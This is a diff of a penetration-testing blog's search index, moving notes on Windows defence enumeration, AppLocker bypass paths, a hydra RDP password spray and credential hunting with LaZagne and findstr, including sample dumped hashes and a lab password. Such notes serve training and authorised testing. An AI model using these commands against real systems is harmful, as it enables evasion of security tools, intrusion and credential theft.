+<td>CylanceSvc.exe</td>
+</tr>
+<tr>
+<td>SentinelOne</td>
+<td>SentinelAgent.exe</td>
+</tr>
+<tr>
+<td>Windows Defender ATP</td>
+<td>MsSense.exe</td>
+</tr>
+</tbody></table>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">tasklist</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">carbon</span>\|<span class="title">cylance</span>\|<span class="title">sentinel</span>\|<span class="title">crowdstrike</span>\|<span class="title">MsSense</span>\|<span class="title">csfalcon</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="AppLocker-Application-Whitelisting"><a href="#AppLocker-Application-Whitelisting" class="headerlink" title="AppLocker : Application Whitelisting"></a>AppLocker : Application Whitelisting</h2><h3 id="Understanding-AppLocker-rules"><a href="#Understanding-AppLocker-rules" class="headerlink" title="Understanding AppLocker rules"></a>Understanding AppLocker rules</h3><blockquote>
+<p>AppLocker is Microsoft’s application whitelisting solution, It can block execution of specific files, entire file types, or anything not from a trusted publisher.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Test if cmd.exe is blocked</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Local</span> | <span class="built_in">Test-AppLockerPolicy</span> <span class="literal">-path</span> C:\Windows\System32\cmd.exe <span class="literal">-User</span> Everyone</span><br><span class="line"></span><br><span class="line">FilePath                          PolicyDecision  MatchingRule</span><br><span class="line"><span class="literal">--------</span>                          <span class="literal">--------------</span>  <span class="literal">------------</span></span><br><span class="line">C:\Windows\System32\cmd.exe       Denied          c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Common-AppLocker-bypass-paths"><a href="#Common-AppLocker-bypass-paths" class="headerlink" title="Common AppLocker bypass paths"></a>Common AppLocker bypass paths</h3><blockquote>
+<p>Even when AppLocker is enabled, several paths are almost always allowed, we can place our tools in these locations:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Temp\         &lt;-- BUILTIN\Users always has write access here</span><br><span class="line">C:\Windows\System32\     &lt;-- Default allowed (can&#x27;t write, but LOLBAS binaries here work)</span><br><span class="line">C:\Program Files\        &lt;-- Usually allowed for execution</span><br><span class="line">%APPDATA%\               &lt;-- Sometimes allowed, user-writable</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Windows Enumeration</category>
+      </categories>
+      <tags>
+        <tag>AppLocker</tag>
+        <tag>wmic</tag>
+        <tag>LOLBAS</tag>
+        <tag>whoami</tag>
+        <tag>systeminfo</tag>
+        <tag>tasklist</tag>
+        <tag>netstat</tag>
+        <tag>ipconfig</tag>
+        <tag>Get-HotFix</tag>
+        <tag>Get-Process</tag>
+        <tag>Get-MpComputerStatus</tag>
+        <tag>Get-AppLockerPolicy</tag>
+        <tag>Windows-Defender</tag>
+        <tag>EDR</tag>
+        <tag>CrowdStrike</tag>
+        <tag>SentinelOne</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RDP Exploitation</title>
     <url>/2025/12/04/RDP-Exploitation/</url>
     <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
@@ -3646,92 +3731,6 @@
         <tag>Writable-Scripts</tag>
         <tag>Writable-Binaries</tag>
         <tag>Persistence</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Protections Enumeration</title>
-    <url>/2026/06/09/Protections-Enumeration/</url>
-    <content><![CDATA[<h3 id="Checking-Windows-Defender-status"><a href="#Checking-Windows-Defender-status" class="headerlink" title="Checking Windows Defender status"></a>Checking Windows Defender status</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMServiceEnabled        : True</span><br><span class="line">AntivirusEnabled        : True</span><br><span class="line">RealTimeProtectionEnabled : False   &lt;<span class="literal">--</span> Disabled! Safe to use standard tools</span><br><span class="line">BehaviorMonitorEnabled  : False</span><br><span class="line">IoavProtectionEnabled   : False</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<ul>
-<li><code>RealTimeProtectionEnabled: False</code> → Defender scanning is off, use tools normally</li>
-<li><code>RealTimeProtectionEnabled: True</code> → need obfuscated or in-memory techniques</li>
-<li><code>BehaviorMonitorEnabled</code> → catches Potato-style attacks even when signature scanning is bypassed</li>
-</ul>
-</blockquote>
-<h3 id="Identifying-third-party-EDR-products"><a href="#Identifying-third-party-EDR-products" class="headerlink" title="Identifying third-party EDR products"></a>Identifying third-party EDR products</h3><blockquote>
-<p>Enterprise environments almost always have an EDR beyond basic Defender :</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>EDR Product</th>
-<th>Process to look for</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CrowdStrike Falcon</td>
-<td>CSFalconService.exe</td>
-</tr>
-<tr>
-<td>Carbon Black</td>
-<td>cb.exe, CarbonBlack.exe</td>
-</tr>
-<tr>
-<td>Cylance</td>
-<td>CylanceSvc.exe</td>
-</tr>
-<tr>
-<td>SentinelOne</td>
-<td>SentinelAgent.exe</td>
-</tr>
-<tr>
-<td>Windows Defender ATP</td>
-<td>MsSense.exe</td>
-</tr>
-</tbody></table>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">tasklist</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">carbon</span>\|<span class="title">cylance</span>\|<span class="title">sentinel</span>\|<span class="title">crowdstrike</span>\|<span class="title">MsSense</span>\|<span class="title">csfalcon</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="AppLocker-Application-Whitelisting"><a href="#AppLocker-Application-Whitelisting" class="headerlink" title="AppLocker : Application Whitelisting"></a>AppLocker : Application Whitelisting</h2><h3 id="Understanding-AppLocker-rules"><a href="#Understanding-AppLocker-rules" class="headerlink" title="Understanding AppLocker rules"></a>Understanding AppLocker rules</h3><blockquote>
-<p>AppLocker is Microsoft’s application whitelisting solution, It can block execution of specific files, entire file types, or anything not from a trusted publisher.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Test if cmd.exe is blocked</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Local</span> | <span class="built_in">Test-AppLockerPolicy</span> <span class="literal">-path</span> C:\Windows\System32\cmd.exe <span class="literal">-User</span> Everyone</span><br><span class="line"></span><br><span class="line">FilePath                          PolicyDecision  MatchingRule</span><br><span class="line"><span class="literal">--------</span>                          <span class="literal">--------------</span>  <span class="literal">------------</span></span><br><span class="line">C:\Windows\System32\cmd.exe       Denied          c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
-
-<h3 id="Common-AppLocker-bypass-paths"><a href="#Common-AppLocker-bypass-paths" class="headerlink" title="Common AppLocker bypass paths"></a>Common AppLocker bypass paths</h3><blockquote>
-<p>Even when AppLocker is enabled, several paths are almost always allowed, we can place our tools in these locations:</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Temp\         &lt;-- BUILTIN\Users always has write access here</span><br><span class="line">C:\Windows\System32\     &lt;-- Default allowed (can&#x27;t write, but LOLBAS binaries here work)</span><br><span class="line">C:\Program Files\        &lt;-- Usually allowed for execution</span><br><span class="line">%APPDATA%\               &lt;-- Sometimes allowed, user-writable</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Windows Enumeration</category>
-      </categories>
-      <tags>
-        <tag>AppLocker</tag>
-        <tag>wmic</tag>
-        <tag>LOLBAS</tag>
-        <tag>whoami</tag>
-        <tag>systeminfo</tag>
-        <tag>tasklist</tag>
-        <tag>netstat</tag>
-        <tag>ipconfig</tag>
-        <tag>Get-HotFix</tag>
-        <tag>Get-Process</tag>
-        <tag>Get-MpComputerStatus</tag>
-        <tag>Get-AppLockerPolicy</tag>
-        <tag>Windows-Defender</tag>
-        <tag>EDR</tag>
-        <tag>CrowdStrike</tag>
-        <tag>SentinelOne</tag>
       </tags>
   </entry>
   <entry>
@@ -4272,6 +4271,54 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows Enumeration</title>
     <url>/2026/06/09/Windows-Enumeration/</url>
     <content><![CDATA[<h1 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h1><blockquote>
@@ -4722,54 +4769,6 @@
         <tag>CeWL</tag>
         <tag>Cupp</tag>
         <tag>Hashcat Rules</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
